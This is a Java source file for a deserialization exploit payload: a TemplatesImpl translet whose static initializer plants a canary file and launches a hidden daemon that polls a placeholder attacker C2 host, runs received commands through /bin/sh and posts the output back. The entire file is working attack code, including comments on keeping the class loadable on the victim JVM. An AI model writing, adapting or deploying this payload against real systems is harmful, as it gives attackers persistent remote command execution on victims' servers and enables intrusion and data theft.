import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * AgentTranslet — TemplatesImpl defineClass → static init → HTTP polling agent (webshell form).
 * __ATTACKER_IP__ / __ATTACKER_PORT__ substituted at build time.
 *
 * SINGLE-CLASS constraint: TemplatesImpl defines only _bytecodes[0], so this class must not
 * reference generated companion classes — anonymous inner classes (Foo$1) would produce
 * NoClassDefFoundError on the victim. The agent thread therefore uses a LAMBDA
 * (invokedynamic, no companion class file).
 *
 * Webshell semantics: outbound-HTTP command channel (no inbound listener), persistent for
 * the life of the victim JVM, executes commands via /bin/sh -c and posts results to the C2.
 */
public class AgentTranslet extends AbstractTranslet {
    static final String C2HOST = "__ATTACKER_IP__";
    static final int C2PORT = __ATTACKER_PORT__;
    static volatile String lastCmd = "";

    static {
        System.err.println("[agent] static init START host=" + C2HOST + " port=" + C2PORT);
        try {
            new java.io.FileOutputStream("/tmp/canary_rce").write(0x42);
            System.err.println("[agent] canary written");
        } catch (Exception e) { System.err.println("[agent] canary FAIL: " + e); }
        Thread t = new Thread(() -> {
            int round = 0;
            while (true) {
                round++;
                try {
                    String cmd = http("GET", "http://" + C2HOST + ":" + C2PORT + "/cmd", null);
                    if (round == 1) System.err.println("[agent] first poll OK: " + (cmd == null ? "null" : cmd.trim()));
                    if (cmd != null && cmd.trim().length() > 0 && !cmd.equals(lastCmd)) {
                        lastCmd = cmd;
                        final String fcmd = cmd.trim();
                        System.err.println("[agent] executing: " + fcmd);
                        Process p = new ProcessBuilder("/bin/sh", "-c", fcmd)
                                .redirectErrorStream(true).start();
                        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                        StringBuilder sb = new StringBuilder();
                        char[] b = new char[2048];
                        int n;
                        while ((n = r.read(b)) >= 0) sb.append(b, 0, n);
                        r.close();
                        http("POST", "http://" + C2HOST + ":" + C2PORT + "/out", sb.toString());
                        System.err.println("[agent] result posted");
                    }
                } catch (Exception e) {
                    if (round == 1) System.err.println("[agent] first poll FAIL: " + e);
                }
                try { Thread.sleep(2000); } catch (Exception ignore) { }
            }
        });
        t.setDaemon(true);
        t.start();
        System.err.println("[agent] daemon thread started");
    }

    static String http(String method, String url, String body) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setRequestMethod(method);
        c.setConnectTimeout(3000);
        c.setReadTimeout(3000);
        if (body != null) {
            c.setDoOutput(true);
            c.getOutputStream().write(body.getBytes());
            c.getOutputStream().flush();
            c.getOutputStream().close();
        }
        java.io.InputStream is = c.getResponseCode() < 400 ? c.getInputStream() : c.getErrorStream();
        java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
        byte[] b = new byte[2048];
        int n;
        while ((n = is.read(b)) >= 0) bo.write(b, 0, n);
        is.close();
        return bo.toString();
    }

    public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) { }
    public void transform(DOM d, SerializationHandler[] h) { }
}
